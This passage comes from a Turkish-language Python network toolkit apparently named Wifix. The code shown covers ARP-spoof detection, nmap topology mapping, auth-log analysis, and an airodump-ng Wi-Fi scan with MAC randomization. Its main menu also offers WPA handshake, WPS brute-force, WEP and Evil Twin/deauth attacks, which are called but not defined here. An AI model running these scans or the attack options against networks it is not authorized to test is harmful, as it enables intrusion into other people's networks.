            print(f"{d['ip']:<16} {d['mac']:<20} {d.get('vendor', ''):<30}")

    report_mgr.add('IP_Scan', {'network': network, 'active_ips': active_ips, 'devices': devices})
    return active_ips

# ============================================================
# MODUL 8: ARP SPOOFING TESPITI & MITM ANALIZI
# ============================================================

def arp_spoof_detection():
    """ARP spoofing ve MITM saldiri tespiti"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [8] ARP SPOOFING TESPITI & MITM ANALIZI"))
    print(c(Colors.HEADER, "=" * 60))

    interface = input(c(Colors.OKCYAN, "[?] Arayuz (bos=otomatik): "))
    if not interface:
        interfaces = get_all_interfaces()
        interface = interfaces[0] if interfaces else "eth0"

    duration = input(c(Colors.OKCYAN, "[?] Izleme suresi saniye (bos=60): "))
    duration = int(duration) if duration else 60

    print(c(Colors.OKCYAN, f"[*] {duration} saniye boyunca ARP trafigi izleniyor..."))
    print(c(Colors.WARNING, "[*] Supheli aktivite tespit edilirse uyarilacak...\n"))

    try:
        from scapy.all import sniff, ARP
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return

    arp_table = {}
    alerts = []
    packet_count = [0]

    def detect_arp_spoof(packet):
        if packet.haslayer(ARP):
            packet_count[0] += 1
            arp = packet[ARP]

            if arp.op == 2:  # ARP reply
                ip = arp.psrc
                mac = arp.hwsrc

                if ip in arp_table:
                    if arp_table[ip] != mac:
                        alert = f"[!] ARP SPOOFING TESPIT EDILDI! IP: {ip} | Eski MAC: {arp_table[ip]} | Yeni MAC: {mac}"
                        print(c(Colors.FAIL, alert))
                        alerts.append({
                            'type': 'ARP_SPOOF',
                            'ip': ip, 'old_mac': arp_table[ip], 'new_mac': mac,
                            'timestamp': datetime.datetime.now().isoformat()
                        })
                else:
                    arp_table[ip] = mac

                # Gateway kontrolu
                gateway = get_default_gateway()
                if ip == gateway and len(arp_table) > 1:
                    gateway_macs = [m for i, m in arp_table.items() if i == gateway]
                    if len(set(gateway_macs)) > 1:
                        alert = f"[!] GATEWAY MAC DEGISIMI! MITM OLABILIR! Gateway: {gateway}"
                        print(c(Colors.FAIL, alert))
                        alerts.append({'type': 'MITM_GATEWAY', 'gateway': gateway})

    try:
        sniff(iface=interface, prn=detect_arp_spoof, timeout=duration, store=0)
    except KeyboardInterrupt:
        pass

    print(f"\n{c(Colors.OKGREEN)}[+] Izleme tamamlandi!{c(Colors.ENDC)}")
    print(f"  Toplanan ARP paketi: {packet_count[0]}")
    print(f"  Ogrenilen IP-MAC eslesmesi: {len(arp_table)}")

    if alerts:
        print(c(Colors.FAIL, f"\n[!] {len(alerts)} tehdit tespit edildi!"))
        for alert in alerts:
            print(f"  - {alert}")
    else:
        print(c(Colors.OKGREEN, "\n[+] Herhangi bir ARP spoofing veya MITM aktivitesi tespit edilmedi."))

    print(c(Colors.OKBLUE, "\n[*] Mevcut ARP tablosu:"))
    print("-" * 50)
    print(f"{'IP Adresi':<18} {'MAC Adresi':<20}")
    print("-" * 50)
    for ip, mac in sorted(arp_table.items()):
        print(f"{ip:<18} {mac:<20}")

    report_mgr.add('ARP_Detection', {
        'interface': interface, 'duration': duration,
        'arp_table': arp_table, 'alerts': alerts
    })
    return alerts

# ============================================================
# MODUL 9: AG HARITALAMA & TOPOLOJI CIKARMA
# ============================================================

def network_mapping():
    """Ag haritalama ve topoloji cikarma"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [9] AG HARITALAMA & TOPOLOJI CIKARMA MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    network = input(c(Colors.OKCYAN, f"[?] Hedef ag (bos={get_local_network()}): "))
    if not network:
        network = get_local_network()

    print(c(Colors.OKCYAN, f"\n[*] Nmap ile ag haritalamasi baslatiliyor: {network}"))
    print(c(Colors.WARNING, "[*] Bu islem 1-2 dakika surebilir...\n"))

    # Nmap OS detection ve versiyon taramasi
    ret, out, err = run_command(f"nmap -O -sV --top-ports 100 {network} 2>/dev/null", timeout=180)

    devices = []
    current_host = None

    if ret == 0:
        for line in out.split('\n'):
            if line.startswith('Nmap scan report'):
                ip = line.split()[-1].strip('()')
                current_host = {'ip': ip, 'hostname': '', 'ports': [], 'os': 'Bilinmiyor', 'mac': ''}
                devices.append(current_host)
            elif current_host and 'MAC Address:' in line:
                parts = line.split('MAC Address: ')[1].split()
                current_host['mac'] = parts[0]
                current_host['vendor'] = ' '.join(parts[1:]).strip('()') if len(parts) > 1 else ''
            elif current_host and 'OS details:' in line:
                current_host['os'] = line.split('OS details:')[1].strip()
            elif current_host and '/tcp' in line and 'open' in line:
                port_info = line.strip()
                current_host['ports'].append(port_info)

    # ARP taramasi ile MAC bilgisi tamamla
    arp_devices = arp_scan(network)
    arp_map = {d['ip']: d for d in arp_devices}

    for device in devices:
        if device['ip'] in arp_map:
            if not device['mac']:
                device['mac'] = arp_map[device['ip']]['mac']
            device['vendor'] = arp_map[device['ip']].get('vendor', '')

    print(c(Colors.OKGREEN, f"\n[+] Ag haritalamasi tamamlandi! {len(devices)} cihaz bulundu.\n"))

    # Topoloji ciktisi
    print(c(Colors.OKBLUE, "=" * 70))
    print(c(Colors.BOLD, "  AG TOPOLOJISI"))
    print(c(Colors.OKBLUE, "=" * 70))

    gateway = get_default_gateway()
    print(f"\n{c(Colors.WARNING)}[GATEWAY]{c(Colors.ENDC)} {gateway}")
    print(f"\n{c(Colors.OKCYAN)}[CIHAZLAR]{c(Colors.ENDC)}")

    for i, device in enumerate(devices, 1):
        print(f"\n{c(Colors.BOLD)}[{i}] {device['ip']}{c(Colors.ENDC)}")
        print(f"    MAC: {device['mac'] or 'N/A'}")
        print(f"    Uretici: {device.get('vendor', 'N/A')}")
        print(f"    OS: {device['os']}")
        if device['ports']:
            print(f"    Acik Portlar:")
            for port in device['ports'][:5]:
                print(f"      - {port}")
            if len(device['ports']) > 5:
                print(f"      ... ve {len(device['ports']) - 5} port daha")

    # ASCII topoloji haritasi
    print(f"\n{c(Colors.OKBLUE)}[BAGLANTI SEMASI]{c(Colors.ENDC)}")
    print(f"\n    [INTERNET]")
    print(f"        |")
    print(f"    [GATEWAY: {gateway}]")
    print(f"        |")
    print(f"    [SWITCH/AP]")
    print(f"        |")
    for device in devices[:10]:
        print(f"    |-- {device['ip']} ({device.get('vendor', 'Bilinmiyor')[:20]})")
    if len(devices) > 10:
        print(f"    |-- ... ve {len(devices) - 10} cihaz daha")

    report_mgr.add('Network_Mapping', {
        'network': network, 'gateway': gateway, 'devices': devices
    })
    return devices

# ============================================================
# MODUL 10: GUVENLIK RAPORLAMA & LOG ANALIZI
# ============================================================

def security_reporting():
    """Guvenlik raporlama ve log analizi"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [10] GUVENLIK RAPORLAMA & LOG ANALIZI MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    print(c(Colors.OKCYAN, "\n[*] Raporlama secenekleri:"))
    print("  1 - Mevcut tarama sonuclarini goruntule")
    print("  2 - JSON raporu olustur ve kaydet")
    print("  3 - Sistem loglarini analiz et (auth.log)")
    print("  4 - Basarisiz giris denemelerini tespit et")
    print("  5 - Ag trafigi ozet raporu")

    choice = input(c(Colors.OKCYAN, "\n[?] Seciminiz (1-5): "))

    if choice == '1':
        print(c(Colors.OKBLUE, f"\n[*] Toplam {len(report_mgr.reports)} tarama kaydi bulundu."))
        for i, report in enumerate(report_mgr.reports, 1):
            print(f"\n{c(Colors.BOLD)}[{i}] {report['module']}{c(Colors.ENDC)}")
            print(f"    Zaman: {report['timestamp']}")
            print(f"    Veri: {json.dumps(report['data'], indent=2, ensure_ascii=False)[:200]}...")

    elif choice == '2':
        filename = input(c(Colors.OKCYAN, "[?] Dosya adi (bos=otomatik): "))
        if not filename:
            filename = f"/tmp/wifix_report_{int(time.time())}.json"
        report_mgr.save(filename)

    elif choice == '3':
        print(c(Colors.OKCYAN, "\n[*] Sistem loglari analiz ediliyor..."))
        log_files = ['/var/log/auth.log', '/var/log/syslog', '/var/log/kern.log']

        for log_file in log_files:
            if os.path.exists(log_file):
                print(c(Colors.OKBLUE, f"\n[*] {log_file} analizi:"))
                ret, out, _ = run_command(f"tail -n 50 {log_file} 2>/dev/null")

                # Guvenlik olaylarini filtrele
                security_events = []
                for line in out.split('\n'):
                    if any(keyword in line.lower() for keyword in ['failed', 'error', 'attack', 'invalid', 'unauthorized', 'denied']):
                        security_events.append(line)

                if security_events:
                    print(c(Colors.WARNING, f"[!] {len(security_events)} guvenlik olayi tespit edildi:"))
                    for event in security_events[-10:]:
                        print(f"  - {event[:100]}")
                else:
                    print(c(Colors.OKGREEN, "[+] Supheli aktivite bulunamadi."))

    elif choice == '4':
        print(c(Colors.OKCYAN, "\n[*] Basarisiz giris denemeleri taraniyor..."))
        ret, out, _ = run_command("grep -i 'failed password' /var/log/auth.log 2>/dev/null | tail -n 20")

        if out.strip():
            print(c(Colors.FAIL, f"[!] Basarisiz giris denemeleri tespit edildi!"))

            # IP bazli analiz
            ip_pattern = re.compile(r'from\s+(\d+\.\d+\.\d+\.\d+)')
            ips = ip_pattern.findall(out)
            ip_counts = Counter(ips)

            print(c(Colors.WARNING, "\n[*] IP bazli saldiri analizi:"))
            for ip, count in ip_counts.most_common(10):
                print(f"  {ip}: {count} deneme")

            if len(ip_counts) > 0:
                print(c(Colors.FAIL, f"\n[!] BRUTE FORCE UYARISI: {ip_counts.most_common(1)[0][0]} adresinden yogun deneme!"))
        else:
            print(c(Colors.OKGREEN, "[+] Basarisiz giris denemesi bulunamadi."))

    elif choice == '5':
        print(c(Colors.OKCYAN, "\n[*] Ag trafigi ozet raporu:"))

        # Arayuz istatistikleri
        ret, out, _ = run_command("ip -s link show 2>/dev/null")
        print(c(Colors.OKBLUE, "\n[*] Arayuz Istatistikleri:"))

        iface = None
        for line in out.split('\n'):
            if ':' in line and 'link/' in line:
                iface = line.split(':')[1].strip()
            if 'RX:' in line or 'TX:' in line:
                print(f"  {iface or 'Unknown'}: {line.strip()}")

        # Aktif baglantilar
        ret, out, _ = run_command("ss -tuln 2>/dev/null | head -20")
        print(c(Colors.OKBLUE, "\n[*] Aktif Dinleme Portlari:"))
        for line in out.split('\n')[1:]:
            if line.strip():
                print(f"  {line.strip()}")

    return True

# ============================================================
# MODUL 11: Wi-Fi AG TARAMA (Yardimci)
# ============================================================

def wifi_scan_menu(interface: str):
    """Wi-Fi aglarini tara"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [Wi-Fi] AG TARAMA MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayuz bulunamadi!"))
            return [], None

        print(c(Colors.OKBLUE, "\n[*] Mevcut arayuzler:"))
        for i, iface in enumerate(interfaces):
            print(f"  {i+1} - {iface}")

        choice = input(c(Colors.OKCYAN, "\n[?] Arayuz secin (1): "))
        try:
            idx = int(choice) - 1 if choice else 0
            interface = interfaces[idx]
        except:
            interface = interfaces[0]

    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return [], None

    randomize_mac(mon_iface)

    print(c(Colors.OKCYAN, f"\n[*] Wi-Fi aglari taraniyor ({mon_iface})..."))
    print(c(Colors.WARNING, "[*] 15 saniye bekleniyor...\n"))

    output_file = f"/tmp/wifiscan_{int(time.time())}"
    cmd = f"airodump-ng {mon_iface} -w {output_file} --output-format csv --write-interval 1 --beacons 2>/dev/null &"
    pid = subprocess.Popen(cmd, shell=True)

    time.sleep(15)

    run_command(f"pkill -f 'airodump-ng {mon_iface}'")
    time.sleep(1)

    networks = []

    csv_file = f"{output_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()

        in_aps = False
        for line in lines:
            if 'BSSID' in line and 'First time seen' in line:
                in_aps = True
                continue
            if in_aps and 'Station MAC' in line:
                break
            if in_aps and line.strip():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    if len(bssid) == 17 and ':' in bssid:
                        network = {
                            'bssid': bssid,
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'auth': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'essid': parts[13],
                            'clients': []
                        }
                        networks.append(network)

        os.remove(csv_file)

    # Temizlik
    for f in [f"{output_file}-01.csv", f"{output_file}-01.kismet.csv", f"{output_file}-01.kismet.netxml"]:
        if os.path.exists(f):
            os.remove(f)

    if networks:
        print(c(Colors.OKGREEN, f"\n[+] Bulunan aglar ({len(networks)}):"))
        print("-" * 100)
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<4} {'Guc':<5} {'Kripto':<12} {'Auth':<10}")
        print("-" * 100)

        networks.sort(key=lambda x: int(x['power']) if x['power'].replace('-','').isdigit() else 0, reverse=True)

        for i, net in enumerate(networks):
            essid = net['essid'] if net['essid'] and net['essid'] != '\\x00' else '<Gizli>'
            power = net['power'] if net['power'] else 'N/A'
            privacy = net['privacy'].strip() if net['privacy'] else 'OPN'

            try:
                pwr = int(power.replace('-',''))
                if pwr >= 80:
                    power_str = c(Colors.OKGREEN, power)
                elif pwr >= 60:
                    power_str = c(Colors.WARNING, power)
                else:
                    power_str = c(Colors.FAIL, power)
            except:
                power_str = power

            print(f"{i+1:<3} {essid:<25} {net['bssid']:<18} {net['channel']:<4} {power_str:<5} {privacy:<12} {net['auth']:<10}")
    else:
        print(c(Colors.WARNING, "[!] Hic ag bulunamadi. Anteni kontrol edin."))

    return networks, mon_iface

# ============================================================
# ANA MENU
# ============================================================

def main_menu():
    """Ana menu"""
    banner()

    check_root()
    check_dependencies()

    interfaces = get_wireless_interfaces()
    default_iface = interfaces[0] if interfaces else "wlan0"

    mon_iface = None
    current_iface = default_iface

    while True:
        print(c(Colors.HEADER, "\n" + "=" * 60))
        print(c(Colors.BOLD, "          WIFIX ANA MENU v3.0"))
        print(c(Colors.HEADER, "=" * 60))

        mon_status = c(Colors.OKGREEN, f"({mon_iface})") if mon_iface else c(Colors.WARNING, "(Kapali)")

        print(f"\n  {c(Colors.OKBLUE, 'Arayuz:')} {current_iface} {mon_status}")

        print(f"\n  {c(Colors.FAIL, '=== HACK ARACLARI ===')}")
        print(f"  {c(Colors.BOLD, '[1]')}  WPA/WPA2 Saldiri (Handshake)")
        print(f"  {c(Colors.BOLD, '[2]')}  WPS Saldiri (PIN Brute Force)")
        print(f"  {c(Colors.BOLD, '[3]')}  WEP Saldiri (IV Toplama)")
        print(f"  {c(Colors.BOLD, '[4]')}  Ikili Seytani Saldiri (Evil Twin + Deauth)")

        print(f"\n  {c(Colors.OKGREEN, '=== SIBER GUVENLIK ARACLARI ===')}")
        print(f"  {c(Colors.BOLD, '[5]')}  Port Tarama")
        print(f"  {c(Colors.BOLD, '[6]')}  Ag Trafigi Dinleme & Analiz")
        print(f"  {c(Colors.BOLD, '[7]')}  IP/Cihaz Tarama & Kesif")
        print(f"  {c(Colors.BOLD, '[8]')}  ARP Spoofing Tespiti & MITM Analizi")
        print(f"  {c(Colors.BOLD, '[9]')}  Ag Haritalama & Topoloji Cikarma")
        print(f"  {c(Colors.BOLD, '[10]')} Guvenlik Raporlama & Log Analizi")

        print(f"\n  {c(Colors.OKBLUE, '=== YARDIMCI ARACLAR ===')}")
        print(f"  {c(Colors.BOLD, '[W]')}  Wi-Fi Ag Tarama")
        print(f"  {c(Colors.BOLD, '[M]')}  MAC Adresi Degistir")
        print(f"  {c(Colors.BOLD, '[R]')}  Rapor Kaydet")
        print(f"  {c(Colors.BOLD, '[0]')}  Cikis")

        choice = input(c(Colors.OKCYAN, "\n  [?] Seciminiz: ")).strip()

        if choice == '0':
            if mon_iface:
                disable_monitor_mode(mon_iface)
            print(c(Colors.OKGREEN, "\n[+] Gorusmek uzere! Wifix kapandi."))
            break

        elif choice == '1':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Once Wi-Fi taramasi yapin (W)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wpa_attack_menu(mon_iface)

        elif choice == '2':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Once Wi-Fi taramasi yapin (W)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wps_attack_menu(mon_iface)

        elif choice == '3':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Once Wi-Fi taramasi yapin (W)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                wep_attack_menu(mon_iface)

        elif choice == '4':
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Once Wi-Fi taramasi yapin (W)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            if mon_iface:
                evil_twin_attack(mon_iface)

        elif choice == '5':
            port_scan_menu()

        elif choice == '6':
            network_monitor_menu(current_iface if not mon_iface else mon_iface)

        elif choice == '7':
            ip_scan_menu()

        elif choice == '8':
            arp_spoof_detection()

        elif choice == '9':
            network_mapping()

        elif choice == '10':
            security_reporting()

        elif choice.lower() == 'w':
            nets, mon_iface = wifi_scan_menu(current_iface)
            if mon_iface:
                current_iface = mon_iface

        elif choice.lower() == 'm':
            if interfaces:
                randomize_mac(interfaces[0])

        elif choice.lower() == 'r':
            report_mgr.save()

        else:
            print(c(Colors.FAIL, f"[!] Gecersiz secim: {choice}"))

        input(c(Colors.OKCYAN, "\n  [*] Devam etmek icin Enter'a basin..."))

# ============================================================
# BASLANGIC
# ============================================================

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(c(Colors.WARNING, "\n\n[!] Ctrl+C ile cikildi."))
        for iface in get_wireless_interfaces():
            disable_monitor_mode(f"{iface}mon")
        sys.exit(0)
    except Exception as e:
        print(c(Colors.FAIL, f"\n[!] Hata: {e}"))
        import traceback
        traceback.print_exc()
        sys.exit(1)
